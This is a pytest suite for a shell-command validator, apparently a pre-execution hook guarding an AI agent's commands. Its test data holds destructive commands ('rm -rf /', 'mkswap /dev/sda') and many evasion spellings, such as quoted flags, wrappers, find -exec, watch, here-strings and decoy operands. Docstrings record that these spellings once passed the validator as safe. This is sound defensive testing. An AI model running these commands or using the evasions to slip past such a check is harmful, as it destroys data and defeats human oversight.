"""Shell-delegated payloads are code, not data (LAB-2754).

`bash -c "<payload>"` hands `<payload>` to bash as a program. The AST sees a quoted
*argument*, so on `main` @ `1353f73` every spelling that kept the quotes off `-c` itself
came back **SAFE / allowed=True** - only the single literal spelling `bash -c "rm -rf /"`
was BLOCKED, by the `nested_shell_execution` regex. Pre-fix verdict is stated per case
below; to reproduce on `main`, comment out the import of the extraction helpers (they do
not exist there, so the module fails at collection rather than at the assertion).

Shell semantics asserted here were verified against the real binaries (bash 5.x, dash,
zsh): `bash -c -- PROG` runs PROG; `bash -ce PROG` runs PROG; `bash -cPROG` is rejected
with "option requires an argument", so an attached payload is not a thing.
"""

import pytest

from schlock.core import validator
from schlock.core.parser import _EXEC_PASSTHROUGH_WRAPPERS, WRAPPER_COMMANDS, BashCommandParser
from schlock.core.rules import RiskLevel
from schlock.core.validator import (
    MAX_DELEGATOR_TOKENS,
    MAX_SHELL_DELEGATION_DEPTH,
    _dash_c_payload,
    _shell_delegated_payloads,
    _watch_payload,
    clear_caches,
    validate_command,
)


@pytest.fixture(autouse=True)
def _no_shellcheck(monkeypatch):
    """Pin verdicts to the rule/AST engine alone.

    ShellCheck independently elevates some of these to BLOCKED, which would let a regression
    hide on any machine that has it installed. AC-1 is specified with ShellCheck unavailable.
    """
    monkeypatch.setattr(validator, "is_shellcheck_available", lambda: False)
    clear_caches()
    yield
    clear_caches()


class TestDashCPayload:
    """Which word does the shell actually execute?"""

    def test_separate_flag(self):
        assert _dash_c_payload(["-c", "rm -rf /"]) == "rm -rf /"

    def test_clustered_flag_takes_next_word(self):
        # getopt: the cluster remainder is never the payload. `bash -ce PROG` runs PROG.
        assert _dash_c_payload(["-ce", "rm -rf /"]) == "rm -rf /"
        assert _dash_c_payload(["-ec", "rm -rf /"]) == "rm -rf /"

    def test_double_dash_before_payload_is_skipped(self):
        # `bash -c -- PROG` runs PROG; reading `--` as the payload was a total bypass.
        assert _dash_c_payload(["-c", "--", "rm -rf /"]) == "rm -rf /"

    def test_double_dash_before_flag_ends_options(self):
        assert _dash_c_payload(["--", "-c", "rm -rf /"]) is None

    def test_long_option_is_not_dash_c(self):
        assert _dash_c_payload(["--rcfile", "x"]) is None

    def test_dash_c_after_long_option_value_is_found(self):
        assert _dash_c_payload(["--rcfile", "x", "-c", "rm -rf /"]) == "rm -rf /"

    def test_leading_script_operand_ends_the_scan(self):
        # `bash deploy.sh -c production` passes -c to the SCRIPT, not to bash.
        assert _dash_c_payload(["deploy.sh", "-c", "production"]) is None

    def test_dangling_flag_has_no_payload(self):
        assert _dash_c_payload(["-c"]) is None

    def test_no_args(self):
        assert _dash_c_payload([]) is None


class TestWatchPayload:
    """`watch` runs its command through `sh -c`, flags and all."""

    def test_bare_command(self):
        assert _watch_payload(["rm -rf /"]) == "rm -rf /"

    def test_flags_of_the_program_survive(self):
        # Dropping every dashed word turned this into `rm /` and defanged the payload.
        assert _watch_payload(["-n", "5", "rm", "-rf", "/"]) == "rm -rf /"

    def test_attached_interval(self):
        assert _watch_payload(["-n5", "date"]) == "date"

    def test_double_dash_ends_watch_options(self):
        assert _watch_payload(["--", "git", "-c", "core.pager=/bin/sh", "log"]) == "git -c core.pager=/bin/sh log"

    def test_valueless_option(self):
        assert _watch_payload(["-d", "date"]) == "date"

    def test_no_command(self):
        assert _watch_payload([]) is None


class TestShellDelegatedPayloadExtraction:
    def _p(self, *cmds):
        return _shell_delegated_payloads(list(cmds))

    def test_plain_dash_c(self):
        assert self._p(("bash", ["-c", "rm -rf /"])) == ["rm -rf /"]

    def test_wrapper_prefix(self):
        assert self._p(("timeout", ["5", "bash", "-c", "rm -rf /"])) == ["rm -rf /"]

    def test_multicall_wrapper(self):
        assert self._p(("busybox", ["sh", "-c", "rm -rf /"])) == ["rm -rf /"]

    def test_wrapper_that_also_owns_dash_c(self):
        # `su -c PROG` and `runuser -u root -- bash -c PROG` are both reachable.
        assert self._p(("su", ["-c", "rm -rf /"])) == ["rm -rf /"]
        assert self._p(("runuser", ["-u", "root", "--", "bash", "-c", "rm -rf /"])) == ["rm -rf /"]

    def test_runner_operand_does_not_end_options(self):
        # `sg GROUP -c PROG` / `su USER -c PROG`: the operand is a group/user, not a script,
        # so unlike a shell it must not stop the scan for -c.
        assert self._p(("sg", ["root", "-c", "rm -rf /"])) == ["rm -rf /"]
        assert self._p(("su", ["postgres", "-c", "rm -rf /"])) == ["rm -rf /"]

    def test_shell_without_dash_c(self):
        assert self._p(("bash", ["script.sh"])) == []

    def test_non_delegator_is_untouched(self):
        assert self._p(("grep", ["-c", "pattern", "file"])) == []
        assert self._p(("echo", ["bash", "-c", "rm -rf /"])) == []

    def test_remote_delegation_is_out_of_scope(self):
        # ssh is a different trust domain; explicitly not covered.
        assert self._p(("ssh", ["host", "bash", "-c", "rm -rf /"])) == []

    def test_bare_shell_has_no_payload(self):
        assert self._p(("bash", [])) == []

    def test_empty_payload_is_ignored(self):
        assert self._p(("bash", ["-c", "   "])) == []

    def test_wrapper_before_runner_keeps_operand_semantics(self):
        # LAB-3004: a wrapper in front of a dash-c RUNNER re-enters the extractor, so the
        # runner's leading user/group operand does not end option parsing. Pre-fix the wrapper
        # branch called `_dash_c_payload` with the default `operand_ends_options=True`, so the
        # operand stopped the scan and this returned [].
        assert self._p(("timeout", ["5", "sg", "root", "-c", "mkswap /dev/sda"])) == ["mkswap /dev/sda"]
        assert self._p(("nice", ["su", "postgres", "-c", "rm -rf /"])) == ["rm -rf /"]

    def test_wrapper_before_watch(self):
        # LAB-3004: `watch` was absent from the wrapper branch's search set entirely, so a
        # wrapped `watch` returned []. It now re-enters through the same extractor.
        assert self._p(("timeout", ["5", "watch", "mkswap /dev/sda"])) == ["mkswap /dev/sda"]
        assert self._p(("env", ["FOO=1", "watch", "-n", "5", "rm", "-rf", "/"])) == ["rm -rf /"]

    def test_nested_wrappers_thread(self):
        # A wrapper wrapping a wrapper resolves to the innermost delegator; a suffix re-reached
        # through a second delegator token is skipped, so exactly one payload, no duplicate.
        assert self._p(("timeout", ["5", "sudo", "bash", "-c", "rm -rf /"])) == ["rm -rf /"]
        assert self._p(("sudo", ["timeout", "5", "sg", "root", "-c", "rm -rf /"])) == ["rm -rf /"]

    def test_wrapper_before_bare_shell_has_no_payload(self):
        # No `-c`, no payload — the recursion must not invent one.
        assert self._p(("timeout", ["5", "bash", "script.sh"])) == []

    def test_decoy_operand_does_not_end_the_scan(self):
        # Panel (LAB-3004): a wrapper OPERAND whose basename collides with a delegator name is a
        # decoy. Scanning only the FIRST match let the decoy end the scan and drop the real
        # payload behind it. Every delegator position is re-entered, so the decoy over-approximates
        # (or yields nothing) while the true payload is still found.
        # `flock ./find sh -c PROG`: lock-file operand basenames to `find`; `find` has no -exec, so
        # only re-entry on the later `sh` recovers the payload.
        assert "mkswap /dev/sda" in self._p(("flock", ["find", "sh", "-c", "mkswap /dev/sda"]))
        assert "mkswap /dev/sda" in self._p(("flock", ["/var/lock/find", "sh", "-c", "mkswap /dev/sda"]))
        # `flock ./sh sg root -c PROG`: operand basenames to shell `sh`; the true runner `sg`
        # sits behind it and must still resolve with runner operand semantics.
        assert "rm -rf /" in self._p(("flock", ["./sh", "sg", "root", "-c", "rm -rf /"]))
        # `strace -o bash sg root -c PROG`: the `-o FILE` value basenames to `bash`.
        assert "rm -rf /" in self._p(("strace", ["-o", "bash", "sg", "root", "-c", "rm -rf /"]))

    @pytest.mark.parametrize("wrapper", ["sudo", "su", "uv"])
    def test_repeated_wrappers_extract_each_suffix_once(self, wrapper, monkeypatch):
        # CodeRabbit on #153 (CWE-400): `sudo sudo ... bash -c PROG` visited every subset of
        # wrapper positions - pre-fix 2^n extractor calls and 2^(n-1) copies of PROG (n=18:
        # 131072 payloads, 0.4 s before the first inner validation). Now quadratic calls, one
        # PROG. `su` is the dual-membership case (owns a -c AND wraps): it still finds PROG once
        # per `su` node, so it pins the payload dedup that `sudo` alone would let rot. Counted,
        # not timed: the recursion resolves the module global, so wrapping it observes every
        # re-entry - the floor proves the wrapper actually saw the recursion.
        calls = 0
        real = validator._shell_delegated_payloads

        def counting(*args, **kwargs):
            nonlocal calls
            calls += 1
            return real(*args, **kwargs)

        monkeypatch.setattr(validator, "_shell_delegated_payloads", counting)
        n = 12
        payloads = counting([(wrapper, [wrapper] * (n - 1) + ["bash", "-c", "mkswap /dev/sda"])])
        assert payloads == ["mkswap /dev/sda"]
        assert calls >= n, f"{calls} extractor calls: the monkeypatch did not observe the recursion"
        assert calls <= (n + 1) ** 2, f"{calls} extractor calls for {n} wrappers: not polynomial"

    def test_ceiling_admits_exactly_max_delegator_tokens(self):
        # CodeRabbit on #153: the sibling test below pins only the reject side, so a `>` -> `>=`
        # slip would start blocking commands that fit the ceiling exactly. n `nice` tokens ahead of
        # `bash -c PROG` is n + 1 distinct suffixes: n = MAX - 1 sits on the ceiling, n = MAX is
        # one past it.
        def chain(n):
            return ("nice", ["nice"] * (n - 1) + ["bash", "-c", "echo ok"])

        assert self._p(chain(MAX_DELEGATOR_TOKENS - 1)) == ["echo ok"]
        with pytest.raises(ValueError, match="delegator tokens"):
            self._p(chain(MAX_DELEGATOR_TOKENS))

    def test_sibling_chains_past_the_ceiling_fail_closed(self):
        # Panel on #153: the per-call memo bounds ONE chain, not k independent chains with
        # distinct tails, so total extraction work still grew with command size - and a
        # PreToolUse hook that outlives its timeout fails OPEN. Past MAX_DELEGATOR_TOKENS
        # distinct suffixes the extractor raises; validate_command's catch-all turns that into
        # BLOCKED with the reason in `error`, which the hook denies on.
        half = MAX_DELEGATOR_TOKENS // 2 + 1  # two chains of `half` nice tokens + bash > ceiling
        progs = ("echo a", "echo b")
        with pytest.raises(ValueError, match="delegator tokens"):
            self._p(*(("nice", ["nice"] * (half - 1) + ["bash", "-c", prog]) for prog in progs))
        command = "; ".join(" ".join(["nice"] * half + ["bash", "-c", prog]) for prog in progs)
        result = validate_command(command)
        assert result.risk_level == RiskLevel.BLOCKED
        assert result.allowed is False
        assert "delegator tokens" in (result.error or "")


class TestFindExecPayloadExtraction:
    """LAB-2767: a shell inside `find -exec ... ;` is a command in its own right.

    `find`'s `-exec`/`-execdir`/`-ok`/`-okdir` clause is opaque `args` to find, so the shell
    it launches was never seen as a delegator. The extractor now re-enters each clause's
    sub-command through the same machinery. Pre-fix (`main` @ `1de8e4c`) every case below
    returned `[]`.

    Terminator note (verified against the parser): a bare `;` is eaten by bash as a command
    separator, so it never reaches find's args; an escaped `\\;` or quoted `';'` survives as a
    literal `;` word; `+` always survives. The escaped/quoted/`+` words end a clause; a bare
    `;` instead splits a later `-exec` clause into a `command not found` fragment that never
    runs the payload, so it is deliberately not chased (test below pins that).
    """

    def _p(self, *cmds):
        return _shell_delegated_payloads(list(cmds))

    def test_exec_shell_dash_c(self):
        assert self._p(("find", [".", "-exec", "bash", "-c", "mkswap /dev/sda"])) == ["mkswap /dev/sda"]

    def test_semicolon_word_terminates_clause(self):
        # Escaped `\\;` / quoted `';'` reach find as a literal `;` word.
        assert self._p(("find", [".", "-exec", "bash", "-c", "mkswap /dev/sda", ";"])) == ["mkswap /dev/sda"]

    def test_plus_terminates_clause(self):
        assert self._p(("find", [".", "-exec", "bash", "-c", "mkswap /dev/sda", "+"])) == ["mkswap /dev/sda"]

    def test_execdir_ok_okdir_all_covered(self):
        for flag in ("-execdir", "-ok", "-okdir"):
            assert self._p(("find", [".", flag, "sh", "-c", "rm -rf /"])) == ["rm -rf /"], flag

    def test_multiple_exec_clauses(self):
        # `find . -exec bash -c "echo hi" \\; -exec sh -c "mkswap /dev/sda" \\;`
        assert self._p(("find", [".", "-exec", "bash", "-c", "echo hi", ";", "-exec", "sh", "-c", "mkswap /dev/sda", ";"])) == [
            "echo hi",
            "mkswap /dev/sda",
        ]

    def test_bare_semicolon_split_pseudo_command_not_chased(self):
        # A bare `;` splits the AST, so a later clause surfaces as a command literally named
        # `-exec`. In a real shell that argv[0] is `command not found`, so the payload never
        # runs - deliberately not chased. A dangerous *first* clause still sits under `find`
        # and is caught by the normal path.
        assert self._p(("-exec", ["sh", "-c", "mkswap /dev/sda"])) == []

    def test_non_shell_exec_is_untouched(self):
        # `-exec grep`/`rm` is not a delegator; find's own rules judge those, not this path.
        assert self._p(("find", [".", "-exec", "grep", "-l", "TODO", "{}"])) == []
        assert self._p(("find", [".", "-exec", "rm", "{}", "+"])) == []

    def test_no_exec_clause(self):
        assert self._p(("find", [".", "-name", "*.pyc", "-delete"])) == []

    def test_brace_placeholder_in_payload_is_passed_through(self):
        # `{}` is a filename find substitutes, not code. It stays verbatim in the payload; the
        # re-validation of `echo {}` is what decides it is harmless, not any stripping here.
        assert self._p(("find", [".", "-exec", "bash", "-c", "echo {}"])) == ["echo {}"]

    def test_wrapper_inside_exec_clause(self):
        # The clause re-enters the FULL extractor, so a wrapped delegator is caught for free.
        assert self._p(("find", [".", "-exec", "sudo", "bash", "-c", "rm -rf /"])) == ["rm -rf /"]

    def test_dangling_exec_flag_has_no_payload(self):
        assert self._p(("find", [".", "-exec"])) == []
        assert self._p(("find", [".", "-exec", ";"])) == []


class TestShellDelegationEvasion:
    """AC-1: every spelling gets at least the bare payload's verdict.

    Pre-fix verdict on `main` @ `1353f73` for each of these: **SAFE / allowed=True**, except
    `bash -c "rm -rf /"` which the literal-quote regex already caught.
    """

    @pytest.mark.parametrize(
        "command",
        [
            'bash -c "rm -rf /"',
            'bash "-c" "rm -rf /"',
            "bash '-c' 'rm -rf /'",
            '"bash" -c "rm -rf /"',
            'bash -"c" "rm -rf /"',
            'timeout 5 bash "-c" "rm -rf /"',
            'bash -c "mkswap /dev/sda"',
            'sh "-c" "mkswap /dev/sda"',
            'watch "rm -rf /"',
            # Panel round: each of these was SAFE against the first cut of the fix.
            'bash -c -- "mkswap /dev/sda"',
            'bash -ce "mkswap /dev/sda"',
            'fish -c "mkswap /dev/sda"',
            'flock /tmp/l bash -c "mkswap /dev/sda"',
            'su -c "mkswap /dev/sda"',
            'sg root -c "mkswap /dev/sda"',
            'systemd-run bash -c "mkswap /dev/sda"',
            "watch -n 5 mkswap /dev/sda",
        ],
    )
    def test_repro_line_is_blocked(self, command):
        result = validate_command(command)
        assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
        assert result.allowed is False

    def test_bare_payload_controls_are_blocked(self):
        # The floor each wrapped form must reach.
        assert validate_command("rm -rf /").risk_level == RiskLevel.BLOCKED
        assert validate_command("mkswap /dev/sda").risk_level == RiskLevel.BLOCKED

    def test_nested_delegation_is_blocked(self):
        assert validate_command("""bash -c "sh -c 'rm -rf /'" """.strip()).risk_level == RiskLevel.BLOCKED

    def test_watch_preserves_flags_that_carry_the_danger(self):
        # `watch -n 5 git -c core.pager=/bin/sh log`: the danger IS the -c flag.
        assert validate_command("watch -n 5 git -c core.pager=/bin/sh log").risk_level == RiskLevel.BLOCKED

    def test_unparseable_payload_fails_closed(self):
        assert validate_command("""bash -c "if [ " """.strip()).risk_level == RiskLevel.BLOCKED

    def test_depth_cap_fails_closed(self):
        # Direct pin on the backstop: unreachable in normal use, so it can only rot untested.
        assert validate_command('bash -c "ls -la"', _depth=MAX_SHELL_DELEGATION_DEPTH).risk_level == RiskLevel.BLOCKED

    def test_recursive_verdicts_do_not_poison_the_cache(self):
        # The depth cap makes a verdict depth-dependent; the cache is keyed on the string alone.
        cold = validate_command("watch watch watch watch ls").risk_level
        clear_caches()
        validate_command("watch watch watch watch watch watch ls")
        assert validate_command("watch watch watch watch ls").risk_level == cold


class TestBenignDelegationUnchanged:
    """AC-2: absolute verdicts pinned against `main` @ `1353f73`."""

    @pytest.mark.parametrize(
        "command",
        [
            'bash -c "ls -la"',
            'sh -c "echo hi"',
            'watch "date"',
            "watch -n 5 date",
            "bash script.sh",
            "bash deploy.sh -c production",
            "grep -c pattern file",
        ],
    )
    def test_benign_stays_safe(self, command):
        result = validate_command(command)
        assert result.risk_level == RiskLevel.SAFE, f"{command!r} -> {result.risk_level.name}"
        assert result.allowed is True

    def test_echo_of_a_shell_c_string_is_unchanged_at_high(self):
        # Extraction correctly ignores it (see test_non_delegator_is_untouched) - the HIGH comes
        # from the pre-existing `alternate_shells_and_escapes` regex, and is HIGH on main too.
        assert validate_command("echo bash -c rm").risk_level == RiskLevel.HIGH

    def test_shell_c_chain_is_not_over_blocked(self):
        # Widening the nested_shell_execution regex to make the quote optional turned this into
        # an unappealable BLOCKED (no preset can relax BLOCKED) on a chmod that is not even in
        # the payload. Reverted; pinned here so it is not re-introduced.
        assert validate_command("bash -c ls && chmod 755 build.sh").risk_level < RiskLevel.BLOCKED


class TestFindExecDelegation:
    """LAB-2767: `find -exec <shell> -c "<payload>"` re-enters validation on the payload.

    Pre-fix verdicts (`main` @ `1de8e4c`, ShellCheck unavailable) stated per case. The HIGH
    ones came from the unrelated `find_exec_dangerous` rule (an ask under `balanced`, allowed
    outright under `permissive`), which never inspected the delegated payload.
    """

    @pytest.mark.parametrize(
        "command",
        [
            # AC-1 repro. Pre-fix: HIGH / allowed=True.
            'find . -exec bash -c "mkswap /dev/sda" ;',
            # Terminator spellings that reach find as a real `;`/`+` word. Pre-fix: HIGH.
            r'find . -exec bash -c "mkswap /dev/sda" \;',
            'find . -exec bash -c "mkswap /dev/sda" +',
            # Every exec-family flag. Pre-fix: HIGH.
            'find . -execdir bash -c "mkswap /dev/sda" ;',
            'find . -ok bash -c "mkswap /dev/sda" ;',
            'find . -okdir bash -c "mkswap /dev/sda" ;',
            # A dangerous FIRST clause reaches find's own args even when a bare `;` splits a
            # later clause off, so it is still caught. Pre-fix: HIGH.
            'find . -exec bash -c "mkswap /dev/sda" ; -exec echo done ;',
            # Two properly-escaped clauses; the dangerous one is second. Pre-fix: HIGH.
            r'find . -exec echo hi \; -exec sh -c "mkswap /dev/sda" \;',
            # Wrapped delegator inside the clause, caught by the same re-entry. Pre-fix: HIGH.
            'find . -exec sudo bash -c "mkswap /dev/sda" ;',
        ],
    )
    def test_delegated_payload_is_blocked(self, command):
        result = validate_command(command)
        assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
        assert result.allowed is False

    def test_bare_payload_control_is_blocked(self):
        # The floor the wrapped forms must reach.
        assert validate_command("mkswap /dev/sda").risk_level == RiskLevel.BLOCKED

    def test_bare_semicolon_second_clause_is_not_executable(self):
        # `find ... -exec echo hi ; -exec sh -c "mkswap" ;` with a BARE `;`: bash splits it, and
        # the second `-exec` is `command not found`, so the payload never runs. schlock leaves it
        # at the pre-existing HIGH (find_exec_dangerous) rather than block a non-executable form.
        assert validate_command('find . -exec echo hi ; -exec sh -c "mkswap /dev/sda" ;').risk_level == RiskLevel.HIGH


class TestWrappedRunnerAndWatchDelegation:
    """LAB-3004: a wrapper in front of a dash-c runner or `watch` gets the bare payload's verdict.

    Pre-fix (`main` @ `a508274`, ShellCheck unavailable) the wrapper branch only searched for a
    dash-c *program command* and called `_dash_c_payload` with the default
    `operand_ends_options=True`, so a wrapped runner's operand ended option parsing and `watch`
    was never looked for at all. Every wrapped form below returned **SAFE / allowed=True** while
    its bare spelling is BLOCKED.
    """

    # WRAPPER_COMMANDS is the source of truth; AC-2 asks specifically that "every wrapper entry"
    # works, so parametrize over a representative spread of them rather than pinning one.
    _WRAPPERS = ["timeout 5", "sudo", "nice", "nohup", "env FOO=1", "flock /tmp/l", "busybox"]

    @pytest.mark.parametrize("wrapper", _WRAPPERS)
    def test_wrapped_runner_is_blocked(self, wrapper):
        # Pre-fix: SAFE / allowed=True.
        result = validate_command(f'{wrapper} sg root -c "mkswap /dev/sda"')
        assert result.risk_level == RiskLevel.BLOCKED, f"{wrapper} -> {result.risk_level.name}"
        assert result.allowed is False

    @pytest.mark.parametrize("wrapper", _WRAPPERS)
    def test_wrapped_watch_is_blocked(self, wrapper):
        # Pre-fix: SAFE / allowed=True.
        result = validate_command(f'{wrapper} watch "mkswap /dev/sda"')
        assert result.risk_level == RiskLevel.BLOCKED, f"{wrapper} -> {result.risk_level.name}"
        assert result.allowed is False

    def test_ac1_repro_lines(self):
        # The two exact repro lines from the ticket. Pre-fix: SAFE / allowed=True.
        for command in ('timeout 5 sg root -c "mkswap /dev/sda"', 'timeout 5 watch "mkswap /dev/sda"'):
            result = validate_command(command)
            assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
            assert result.allowed is False

    def test_dual_membership_forms_still_resolve(self):
        # su/sg/runuser are both runners and wrappers; both the bare runner and the wrapped
        # runner must resolve. Pre-fix the wrapped `sudo su -c` was already BLOCKED (su is a
        # dash-c command found by the old search set) — pinned so the recursion keeps it.
        for command in (
            'su -c "mkswap /dev/sda"',
            'sudo su -c "mkswap /dev/sda"',
            'sudo bash -c "mkswap /dev/sda"',
            'busybox sh -c "mkswap /dev/sda"',
        ):
            assert validate_command(command).risk_level == RiskLevel.BLOCKED, command

    def test_nested_wrapper_is_blocked(self):
        # A wrapper wrapping a wrapper threads to the innermost delegator. Pre-fix: SAFE.
        assert validate_command('timeout 5 sudo watch "mkswap /dev/sda"').risk_level == RiskLevel.BLOCKED
        assert validate_command('sudo timeout 5 sg root -c "mkswap /dev/sda"').risk_level == RiskLevel.BLOCKED

    @pytest.mark.parametrize(
        "command",
        [
            # Panel (LAB-3004): a wrapper operand / option value whose basename collides with a
            # delegator name is a decoy that, under a first-match scan, ended the scan and dropped
            # the real payload — the exact wrapped-runner/watch bypass this ticket closes, reopened
            # one layer down. Each of these was SAFE / allowed=True against the first-match cut of
            # the fix; the bare `sg root -c ...` / `sh -c ...` control is BLOCKED.
            'flock find sh -c "mkswap /dev/sda"',  # lock-file operand basenames to `find`
            'flock /tmp/sh sg root -c "mkswap /dev/sda"',  # operand basenames to shell `sh`
            'flock /tmp/bash watch "mkswap /dev/sda"',  # decoy + wrapped watch
            'strace -o bash sg root -c "mkswap /dev/sda"',  # `-o FILE` value basenames to `bash`
            'ltrace -o sh sg root -c "mkswap /dev/sda"',
            'nsenter --root=/tmp/bash sg root -c "mkswap /dev/sda"',
            'env A=1 flock /tmp/sh sg root -c "mkswap /dev/sda"',
        ],
    )
    def test_decoy_token_before_delegator_is_blocked(self, command):
        result = validate_command(command)
        assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
        assert result.allowed is False

    def test_wrapped_multiclause_find_all_clauses_scanned(self):
        # Panel (LAB-3004): with `find` in the scan set, a WRAPPED multi-clause find routes through
        # the find branch so EVERY -exec clause is inspected, not just the first. Escaped `\;` keeps
        # both clauses under one find; the dangerous second clause must not slip. Pre-fix: SAFE.
        assert (
            validate_command(r'timeout 5 find . -exec sh -c ls \; -exec sh -c "mkswap /dev/sda" \;').risk_level
            == RiskLevel.BLOCKED
        )

    @pytest.mark.parametrize(
        "command",
        [
            # AC-2: benign wrapped forms must NOT be over-blocked by the recursion.
            'timeout 5 sg root -c "ls -la"',
            "timeout 5 watch date",
            "nice watch -n 5 date",
            "timeout 5 bash script.sh",
        ],
    )
    def test_benign_wrapped_forms_stay_safe(self, command):
        result = validate_command(command)
        assert result.risk_level == RiskLevel.SAFE, f"{command!r} -> {result.risk_level.name}"
        assert result.allowed is True

    @pytest.mark.parametrize(
        "command",
        [
            "strace -o bash ls -la",
            "strace -o sh -f python3 app.py",
            "ltrace -o watch make",
            "flock /var/lock/find ls -la",
            "flock /var/lock/watch git status",
            "nsenter --root=/tmp/bash ls",
        ],
    )
    def test_benign_delegator_named_operand_is_not_denied(self, command):
        """The over-approximation has a bound, and this is it.

        The scan re-enters on a wrapper's own operands and option VALUES too, not only on the
        wrapped command, because telling them apart needs a per-wrapper getopt table whose
        failure mode is fail-OPEN: one wrong entry skips the real command and drops the payload,
        which is the decoy bypass this class exists to close. The price is that a benign file
        named after a delegator gets its tail re-validated - so pin that the price stays below
        ask/deny. Measured across every `_DELEGATOR_COMMANDS` name x 10 benign tails (1380
        pairs), one verdict moved at all (`ltrace -o watch make`, SAFE -> LOW, still allowed);
        the only ask/deny hits were `sudo`/`su`/`doas`/`pkexec` FILENAMES, which the
        pre-existing `sudo_use` / `privilege_escalation_variants` regex rules block on `main`
        identically - not this scan. Asserted as "never denied", not "always SAFE", because
        LOW is the honest current value and pinning SAFE would be pinning a fiction.
        """
        result = validate_command(command)
        assert result.allowed is True, f"{command!r} -> {result.risk_level.name}"
        assert result.risk_level < RiskLevel.HIGH, f"{command!r} -> {result.risk_level.name}"


class TestFindExecUnchanged:
    """AC-2: absolute verdicts pinned against `main` @ `1de8e4c` (ShellCheck unavailable).

    None of these carry a dangerous delegated payload, so the re-entry adds nothing above the
    verdict find's own command-aware rules already produce.
    """

    def test_readonly_exec_stays_safe(self):
        # `-exec grep` is read-only; find's rules leave it SAFE and the payload path is a no-op.
        assert validate_command("find . -exec grep -l TODO {} ;").risk_level == RiskLevel.SAFE

    def test_delete_predicate_stays_high(self):
        # `-delete` has no `-exec` clause; the `recursive_delete` rule keeps it HIGH.
        assert validate_command('find . -name "*.pyc" -delete').risk_level == RiskLevel.HIGH

    def test_brace_placeholder_payload_stays_high(self):
        # `echo {}` re-validates SAFE (< HIGH), so the pre-existing find_exec_dangerous HIGH stands.
        assert validate_command('find . -exec bash -c "echo {}" ;').risk_level == RiskLevel.HIGH


# --------------------------------------------------------------------------------------------
# LAB-2768: here-strings (`bash <<< "..."`) are the same code-not-data sink as `-c`, but the
# payload hangs off a redirect node the word-walkers skip. On `main` @ `1de8e4c` (post-LAB-2754)
# `extract_stdin_program_redirects` does not exist, so the extraction class below fails at
# collection; the integration cases run and show the pre-fix verdict stated per case.
# --------------------------------------------------------------------------------------------


class TestHereStringPayloadExtraction:
    """The parser must surface the here-string a bare interpreter runs as a program."""

    def _extract(self, command):
        parser = BashCommandParser()
        return parser.extract_stdin_program_redirects(parser.parse(command))

    def test_bare_shell_here_string_is_the_program(self):
        assert self._extract('bash <<< "rm -rf /"') == [("bash", "rm -rf /")]

    def test_dash_s_reads_stdin_as_program(self):
        # `bash -s` explicitly reads commands from stdin.
        assert self._extract('bash -s <<< "mkswap /dev/sda"') == [("bash", "mkswap /dev/sda")]

    def test_dash_c_means_here_string_is_inert_data(self):
        # bash runs the -c program; the here-string is data on a stdin nothing reads.
        assert self._extract('bash -c "echo hi" <<< "rm -rf /"') == []

    def test_script_operand_means_here_string_is_data(self):
        assert self._extract('bash script.sh <<< "rm -rf /"') == []

    def test_non_interpreter_is_untouched(self):
        assert self._extract('cat <<< "some text"') == []
        assert self._extract('grep foo <<< "$line"') == []

    def test_multicall_resolves_to_applet(self):
        assert self._extract('busybox sh <<< "rm -rf /"') == [("sh", "rm -rf /")]

    def test_wrapper_passes_stdin_through_to_shell(self):
        # `timeout 5 bash <<< X` / `env FOO=1 bash <<< X` / `stdbuf ... bash <<< X`: the wrapper
        # execs bash, which inherits the wrapper's stdin (the here-string). Verified against the
        # real binaries (timeout/env/stdbuf/nice).
        assert self._extract('timeout 5 bash <<< "rm -rf /"') == [("bash", "rm -rf /")]
        assert self._extract('env FOO=1 bash <<< "rm -rf /"') == [("bash", "rm -rf /")]
        assert self._extract('stdbuf -o0 bash <<< "rm -rf /"') == [("bash", "rm -rf /")]

    def test_compound_here_string_finds_the_first_command_sink(self):
        # A `<<<` on a subshell/brace group feeds the group's stdin; a command inside runs it.
        # bashlex hangs the redirect on the compound node, not the inner command.
        assert self._extract('( bash ) <<< "rm -rf /"') == [("bash", "rm -rf /")]
        assert self._extract('{ bash; } <<< "rm -rf /"') == [("bash", "rm -rf /")]

    def test_compound_here_string_finds_a_later_command_sink(self):
        # CodeRabbit CWE-78 (Critical, #151): the stdin consumer need not be the FIRST command -
        # an earlier command that does not read stdin (`true`, `echo`) leaves the here-string for
        # the next. Checking only _first_command_node missed all of these. Verified in real bash.
        assert self._extract('{ true; bash; } <<< "rm -rf /"') == [("bash", "rm -rf /")]
        assert self._extract('( true; bash ) <<< "rm -rf /"') == [("bash", "rm -rf /")]
        assert self._extract('{ echo pre; bash; } <<< "rm -rf /"') == [("bash", "rm -rf /")]
        assert self._extract('while :; do bash; done <<< "rm -rf /"') == [("bash", "rm -rf /")]
        assert self._extract('if true; then bash; fi <<< "rm -rf /"') == [("bash", "rm -rf /")]
        assert self._extract('for i in 1; do bash; done <<< "rm -rf /"') == [("bash", "rm -rf /")]

    def test_compound_without_an_interpreter_surfaces_nothing(self):
        # Only a stdin-executing interpreter is a sink; `cat`/`read` consume stdin but never run it.
        assert self._extract('{ true; cat; } <<< "some text"') == []
        assert self._extract('{ read a; read b; } <<< "$data"') == []

    def test_compound_wrapper_here_string(self):
        assert self._extract('( timeout 5 bash ) <<< "rm -rf /"') == [("bash", "rm -rf /")]

    def test_rbash_reads_stdin_as_program(self):
        # rbash is in _SHELL_COMMANDS (the `-c` path caught it); the here-string surface must agree.
        assert self._extract('rbash <<< "rm -rf /"') == [("rbash", "rm -rf /")]

    def test_wrapped_shell_with_dash_c_is_not_a_stdin_program(self):
        # `timeout 5 bash -c "echo hi" <<< X`: bash runs the -c program; the here-string is inert.
        assert self._extract('timeout 5 bash -c "echo hi" <<< "rm -rf /"') == []

    def test_here_string_off_a_non_stdin_redirect_is_ignored(self):
        # A plain input redirect (`< file`) is not a here-string; nothing to surface.
        assert self._extract("bash < script.sh") == []

    def test_here_string_on_another_fd_is_not_the_program(self):
        # bash runs its stdin. `3<<< X` fills fd 3 and nothing reads it (verified: `bash 3<<< "echo
        # x"` prints nothing; `bash <<< "echo a" 3<<< "echo b"` prints a). Taking the last `<<<`
        # regardless of fd let a trailing fd-3 decoy displace the stdin payload.
        assert self._extract('bash <<< "rm -rf /" 3<<< "ls"') == [("bash", "rm -rf /")]
